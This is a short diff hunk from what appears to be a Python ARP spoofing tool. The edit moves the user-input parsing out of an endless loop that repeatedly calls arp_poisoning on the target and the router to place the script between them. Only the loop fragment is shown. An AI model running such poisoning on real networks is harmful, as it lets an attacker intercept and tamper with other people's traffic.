@@ -42,8 +42,8 @@ def reset_operation(fooled_ip,gateway_ip):
 numberOfPackets = 0
 
 try:
-    while True:
-        (options,arguments) = user_input()
+    (options,arguments) = user_input()
+    while True:     
 
         arp_poisoning(options.target,options.router)
         arp_poisoning(options.router,options.target)
